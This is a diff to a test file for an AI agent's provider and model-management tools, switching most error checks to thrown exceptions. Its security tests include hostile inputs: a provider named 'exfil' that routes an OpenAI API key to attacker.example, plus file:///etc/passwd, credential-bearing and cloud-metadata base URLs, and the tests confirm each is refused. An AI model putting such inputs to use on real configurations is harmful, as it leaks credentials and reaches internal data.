@@ -121,23 +121,23 @@ describe('fallback_profile_manage', () => {
 
   it('rejects set without name', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), FALLBACK_PROFILE_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'set', chain: ['test-provider/test-model'] });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('name');
+    await expect(run(tool, { action: 'set', chain: ['test-provider/test-model'] })).rejects.toThrow(
+      /name/,
+    );
   });
 
   it('rejects set without chain', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), FALLBACK_PROFILE_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'set', name: 'x' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('chain');
+    await expect(run(tool, { action: 'set', name: 'x' })).rejects.toThrow(/chain/);
   });
 
-  it('rejects set with non-favorite entries', async () => {
-    const tool = getTool(createFallbackManageTools(makeOpts()), FALLBACK_PROFILE_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'set', name: 'x', chain: ['anthropic/claude-3'] });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not in your favorites');
+  it('rejects set with non-favorite entries without persisting', async () => {
+    const opts = makeOpts();
+    const tool = getTool(createFallbackManageTools(opts), FALLBACK_PROFILE_MANAGE_TOOL_NAME);
+    await expect(
+      run(tool, { action: 'set', name: 'x', chain: ['anthropic/claude-3'] }),
+    ).rejects.toThrow(/not in your favorites/);
+    expect(opts.updateConfig).not.toHaveBeenCalled();
   });
 
   it('deletes an existing profile', async () => {
@@ -150,15 +150,12 @@ describe('fallback_profile_manage', () => {
 
   it('rejects deleting a nonexistent profile', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), FALLBACK_PROFILE_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'delete', name: 'ghost' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not found');
+    await expect(run(tool, { action: 'delete', name: 'ghost' })).rejects.toThrow(/not found/);
   });
 
   it('rejects delete without name', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), FALLBACK_PROFILE_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'delete' });
-    expect(result.status).toBe('error');
+    await expect(run(tool, { action: 'delete' })).rejects.toThrow(/name/);
   });
 });
 
@@ -187,9 +184,9 @@ describe('agent_model_assign', () => {
 
   it('rejects conflicting modes', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), AGENT_MODEL_ASSIGN_TOOL_NAME);
-    const result = await run(tool, { role: 'bug-hunter', clear: true, model: 'test-model' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('Conflicting');
+    await expect(
+      run(tool, { role: 'bug-hunter', clear: true, model: 'test-model' }),
+    ).rejects.toThrow(/Conflicting/);
   });
 
   it('clears a matrix entry', async () => {
@@ -231,9 +228,7 @@ describe('agent_model_assign', () => {
 
   it('rejects assigning a nonexistent profile', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), AGENT_MODEL_ASSIGN_TOOL_NAME);
-    const result = await run(tool, { role: 'bug-hunter', profile: 'ghost' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not found');
+    await expect(run(tool, { role: 'bug-hunter', profile: 'ghost' })).rejects.toThrow(/not found/);
   });
 
   it('assigns a favorite model to a role', async () => {
@@ -246,16 +241,16 @@ describe('agent_model_assign', () => {
 
   it('rejects assigning a non-favorite model', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), AGENT_MODEL_ASSIGN_TOOL_NAME);
-    const result = await run(tool, { role: 'bug-hunter', model: 'claude-3' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not in your favorites');
+    await expect(run(tool, { role: 'bug-hunter', model: 'claude-3' })).rejects.toThrow(
+      /not in your favorites/,
+    );
   });
 
   it('rejects invalid matrix keys', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), AGENT_MODEL_ASSIGN_TOOL_NAME);
-    const result = await run(tool, { role: 'invalid role!!', model: 'test-model' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not a valid matrix key');
+    await expect(run(tool, { role: 'invalid role!!', model: 'test-model' })).rejects.toThrow(
+      /not a valid matrix key/,
+    );
   });
 
   describe('favoriteModelsOnly contract on model-only mode', () => {
@@ -331,9 +326,9 @@ describe('agent_model_assign', () => {
       for (const toggleValue of [false, true]) {
         const opts = makeOpts({ favoriteModelsOnly: toggleValue });
         const tool = getTool(createFallbackManageTools(opts), AGENT_MODEL_ASSIGN_TOOL_NAME);
-        const result = await run(tool, { role: 'bug-hunter', model: 'claude-3' });
-        expect(result.status).toBe('error');
-        expect(result.message).toContain('not in your favorites');
+        await expect(run(tool, { role: 'bug-hunter', model: 'claude-3' })).rejects.toThrow(
+          /not in your favorites/,
+        );
       }
     });
 
@@ -361,13 +356,13 @@ describe('agent_model_assign', () => {
       for (const toggleValue of [false, true]) {
         const opts = makeOpts({ favoriteModelsOnly: toggleValue });
         const tool = getTool(createFallbackManageTools(opts), AGENT_MODEL_ASSIGN_TOOL_NAME);
-        const result = await run(tool, {
-          role: 'bug-hunter',
-          provider: 'test-provider',
-          model: 'claude-3',
-        });
-        expect(result.status).toBe('error');
-        expect(result.message).toContain('not in your favorites');
+        await expect(
+          run(tool, {
+            role: 'bug-hunter',
+            provider: 'test-provider',
+            model: 'claude-3',
+          }),
+        ).rejects.toThrow(/not in your favorites/);
       }
     });
   });
@@ -402,15 +397,14 @@ describe('provider_manage', () => {
 
   it('rejects adding a duplicate provider', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), PROVIDER_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'add', provider: 'test-provider', type: 'openai' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('already exists');
+    await expect(
+      run(tool, { action: 'add', provider: 'test-provider', type: 'openai' }),
+    ).rejects.toThrow(/already exists/);
   });
 
   it('rejects add without provider or type', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), PROVIDER_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'add' });
-    expect(result.status).toBe('error');
+    await expect(run(tool, { action: 'add' })).rejects.toThrow(/Provide "provider"/);
   });
 
   it('configures an existing provider', async () => {
@@ -510,15 +504,15 @@ describe('provider_manage', () => {
         },
       });
       const tool = getTool(createFallbackManageTools(opts), PROVIDER_MANAGE_TOOL_NAME);
-      const result = await run(tool, {
-        action: 'add',
-        provider: 'exfil',
-        type: 'openai-compatible',
-        baseUrl: 'https://attacker.example/v1',
-        envVars: ['OPENAI_API_KEY'],
-      });
-      expect(result.status).toBe('error');
-      expect(result.message).toContain('already supplies the key for provider "openai"');
+      await expect(
+        run(tool, {
+          action: 'add',
+          provider: 'exfil',
+          type: 'openai-compatible',
+          baseUrl: 'https://attacker.example/v1',
+          envVars: ['OPENAI_API_KEY'],
+        }),
+      ).rejects.toThrow('already supplies the key for provider "openai"');
       const cfg = opts.getConfig() as unknown as { providers: Record<string, unknown> };
       expect(cfg.providers.exfil).toBeUndefined();
     });
@@ -575,17 +569,18 @@ describe('provider_manage', () => {
     it('rejects non-HTTP and credential-bearing base URLs on configure and add', async () => {
       const tool = getTool(createFallbackManageTools(withKey()), PROVIDER_MANAGE_TOOL_NAME);
       for (const baseUrl of ['file:///etc/passwd', 'https://user:pw@evil.example', 'not a url']) {
-        const result = await run(tool, { action: 'configure', provider: 'test-provider', baseUrl });
-        expect(result.status).toBe('error');
-        expect(result.message).toContain('Invalid baseUrl');
+        await expect(
+          run(tool, { action: 'configure', provider: 'test-provider', baseUrl }),
+        ).rejects.toThrow(/Invalid baseUrl/);
       }
-      const added = await run(tool, {
-        action: 'add',
-        provider: 'new-one',
-        type: 'openai',
-        baseUrl: 'ftp://example.com',
-      });
-      expect(added.status).toBe('error');
+      await expect(
+        run(tool, {
+          action: 'add',
+          provider: 'new-one',
+          type: 'openai',
+          baseUrl: 'ftp://example.com',
+        }),
+      ).rejects.toThrow(/Invalid baseUrl/);
     });
 
     it('still allows local providers — Ollama, LM Studio, omniroute', async () => {
@@ -608,9 +603,9 @@ describe('provider_manage', () => {
 
   it('rejects configuring a missing provider', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), PROVIDER_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'configure', provider: 'ghost' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not found');
+    await expect(run(tool, { action: 'configure', provider: 'ghost' })).rejects.toThrow(
+      /not found/,
+    );
   });
 
   it('removes a non-leader provider', async () => {
@@ -628,9 +623,9 @@ describe('provider_manage', () => {
 
   it('rejects removing the leader provider', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), PROVIDER_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'remove', provider: 'test-provider' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('Cannot remove the active leader');
+    await expect(run(tool, { action: 'remove', provider: 'test-provider' })).rejects.toThrow(
+      /Cannot remove the active leader/,
+    );
   });
 });
 
@@ -639,9 +634,29 @@ describe('provider_manage', () => {
 describe('provider_key_set', () => {
   it('rejects both key and envVar', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), PROVIDER_KEY_SET_TOOL_NAME);
-    const result = await run(tool, { provider: 'test-provider', key: 'sk-x', envVar: 'X' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not both');
+    await expect(
+      run(tool, { provider: 'test-provider', key: 'sk-x', envVar: 'X' }),
+    ).rejects.toThrow(/not both/);
+  });
+
+  it('throws (and stores nothing) when interactive input fails', async () => {
+    const opts = makeOpts();
+    opts.requestInput = vi.fn(async () => {
+      throw new Error('prompt closed');
+    });
+    const tool = getTool(createFallbackManageTools(opts), PROVIDER_KEY_SET_TOOL_NAME);
+    await expect(run(tool, { provider: 'test-provider' })).rejects.toThrow(
+      /Interactive input failed or was cancelled: prompt closed/,
+    );
+    expect(opts.updateConfig).not.toHaveBeenCalled();
+  });
+
+  it('throws when the interactive prompt returns an empty key', async () => {
+    const opts = makeOpts();
+    opts.requestInput = vi.fn(async () => '   ');
+    const tool = getTool(createFallbackManageTools(opts), PROVIDER_KEY_SET_TOOL_NAME);
+    await expect(run(tool, { provider: 'test-provider' })).rejects.toThrow(/No key was entered/);
+    expect(opts.updateConfig).not.toHaveBeenCalled();
   });
 
   it('returns needs_key when no key source and no requestInput', async () => {
@@ -670,9 +685,9 @@ describe('provider_key_set', () => {
 
   it('rejects missing environment variable', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), PROVIDER_KEY_SET_TOOL_NAME);
-    const result = await run(tool, { provider: 'test-provider', envVar: 'NONEXISTENT_VAR_XYZ' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not set');
+    await expect(
+      run(tool, { provider: 'test-provider', envVar: 'NONEXISTENT_VAR_XYZ' }),
+    ).rejects.toThrow(/not set/);
   });
 
   it('stores a directly provided key', async () => {
@@ -716,9 +731,10 @@ describe('leader_model_set', () => {
   });
 
   it('rejects set without provider or model', async () => {
-    const tool = getTool(createFallbackManageTools(makeOpts()), LEADER_MODEL_SET_TOOL_NAME);
-    const result = await run(tool, { action: 'set' });
-    expect(result.status).toBe('error');
+    const opts = makeOpts();
+    const tool = getTool(createFallbackManageTools(opts), LEADER_MODEL_SET_TOOL_NAME);
+    await expect(run(tool, { action: 'set' })).rejects.toThrow(/Provide "provider" and "model"/);
+    expect(opts.updateConfig).not.toHaveBeenCalled();
   });
 
   it('derives leader from a profile', async () => {
@@ -731,15 +747,12 @@ describe('leader_model_set', () => {
 
   it('rejects profile without name', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), LEADER_MODEL_SET_TOOL_NAME);
-    const result = await run(tool, { action: 'profile' });
-    expect(result.status).toBe('error');
+    await expect(run(tool, { action: 'profile' })).rejects.toThrow(/Provide "profile"/);
   });
 
   it('rejects nonexistent profile', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), LEADER_MODEL_SET_TOOL_NAME);
-    const result = await run(tool, { action: 'profile', profile: 'ghost' });
-    expect(result.status).toBe('error');
-    expect(result.message).toContain('not found');
+    await expect(run(tool, { action: 'profile', profile: 'ghost' })).rejects.toThrow(/not found/);
   });
 
   it('toggles fallbackAuto', async () => {
@@ -752,8 +765,7 @@ describe('leader_model_set', () => {
 
   it('rejects toggle without name or value', async () => {
     const tool = getTool(createFallbackManageTools(makeOpts()), LEADER_MODEL_SET_TOOL_NAME);
-    const result = await run(tool, { action: 'toggle' });
-    expect(result.status).toBe('error');
+    await expect(run(tool, { action: 'toggle' })).rejects.toThrow(/Provide "toggle"/);
   });
 
   describe('live switch integration', () => {
@@ -787,10 +799,9 @@ describe('leader_model_set', () => {
       const switchProviderAndModel = vi.fn(async () => 'provider "openai" is not configured');
       const opts = { ...makeOpts(), switchProviderAndModel };
       const tool = getTool(createFallbackManageTools(opts), LEADER_MODEL_SET_TOOL_NAME);
-      const result = await run(tool, { action: 'set', provider: 'openai', model: 'gpt-4o' });
-      expect(result.status).toBe('error');
-      expect(result.message).toContain('not configured');
-      expect(result.message).toContain('Config was not changed');
+      await expect(
+        run(tool, { action: 'set', provider: 'openai', model: 'gpt-4o' }),
+      ).rejects.toThrow(/not configured[\s\S]*Config was not changed/);
       expect(opts.updateConfig).not.toHaveBeenCalled();
     });
 
@@ -821,16 +832,16 @@ describe('provider_manage — VULN-006 endpoint guard (tool level)', () => {
   //  - other private/loopback hosts stay allowed (Ollama/LM Studio/omniroute
   //    contract, same-user boundary); the credential-theft half of VULN-006
   //    is closed by the envVars sentinel + resolver suppression below.
-  it.each([
-    'http://169.254.169.254/latest/meta-data/',
-    'http://0.0.0.0/v1',
-  ])('refuses %s (metadata/link-local destination)', async (baseUrl) => {
-    const tools = createFallbackManageTools(makeOpts());
-    const tool = getTool(tools, PROVIDER_MANAGE_TOOL_NAME);
-    const result = await run(tool, { action: 'configure', provider: 'test-provider', baseUrl });
-    expect(result.status).toBe('error');
-    expect(String(result.message)).toMatch(/link-local|metadata/i);
-  });
+  it.each(['http://169.254.169.254/latest/meta-data/', 'http://0.0.0.0/v1'])(
+    'refuses %s (metadata/link-local destination)',
+    async (baseUrl) => {
+      const tools = createFallbackManageTools(makeOpts());
+      const tool = getTool(tools, PROVIDER_MANAGE_TOOL_NAME);
+      await expect(
+        run(tool, { action: 'configure', provider: 'test-provider', baseUrl }),
+      ).rejects.toThrow(/link-local|metadata/i);
+    },
+  );
 
   it('allows a credential-less loopback endpoint (Ollama/LM Studio contract)', async () => {
     const tools = createFallbackManageTools(makeOpts());
@@ -869,6 +880,46 @@ describe('provider_manage — VULN-006 endpoint guard (tool level)', () => {
     const entry = cfg.providers['test-provider']!;
     expect(entry.envVars).toEqual([]);
     expect(entry.apiKey).toBeUndefined();
+  });
+});
+
+describe('leader_tier_set — failures are tool errors', () => {
+  const tierOpts = (leader: Record<string, unknown> = {}) =>
+    makeOpts({
+      modelTiers: {
+        enabled: true,
+        levels: { budget: { provider: 'test-provider', model: 'other-model' } },
+        leader,
+      },
+    });
+
+  it('throws when the tier layer is disabled', async () => {
+    const tool = getTool(createFallbackManageTools(makeOpts()), 'leader_tier_set');
+    await expect(run(tool, { action: 'show' })).rejects.toThrow(/not enabled/);
+  });
+
+  it('throws for a tier that does not resolve', async () => {
+    const tool = getTool(createFallbackManageTools(tierOpts()), 'leader_tier_set');
+    await expect(run(tool, { action: 'set', tier: 'premium' })).rejects.toThrow(
+      /does not resolve to a model/,
+    );
+  });
+
+  it('throws when the policy refuses the switch, without touching config', async () => {
+    const opts = tierOpts({ mode: 'off' });
+    const tool = getTool(createFallbackManageTools(opts), 'leader_tier_set');
+    await expect(run(tool, { action: 'set', tier: 'budget' })).rejects.toThrow(
+      /Refused \(disabled\)/,
+    );
+    expect(opts.updateConfig).not.toHaveBeenCalled();
+  });
+
+  it('keeps a proposal as a successful result', async () => {
+    const opts = tierOpts();
+    const tool = getTool(createFallbackManageTools(opts), 'leader_tier_set');
+    const result = await run(tool, { action: 'set', tier: 'budget', reason: 'mechanical work' });
+    expect(result.status).toBe('proposed');
+    expect(opts.updateConfig).not.toHaveBeenCalled();
   });
 });
 
